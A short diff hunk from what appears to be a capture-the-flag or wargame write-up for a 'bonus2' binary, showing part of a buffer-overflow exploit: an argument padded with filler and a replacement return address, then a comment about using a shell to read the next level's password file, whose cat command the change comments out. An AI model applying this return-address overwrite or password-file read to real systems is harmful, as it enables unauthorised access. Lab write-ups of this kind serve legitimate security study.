@@ -40,4 +40,4 @@ ARG2="${ARG2_FILLER}${GREETUSER_RETURN_ADDRESS_REPLACEMENT}"
 LANG="nl" ./bonus2 "${ARG1}" "${ARG2}"
 
 # We use the reverse shell to retrieve the password
-$ cat /home/user/bonus3/.pass
+# $> cat /home/user/bonus3/.pass
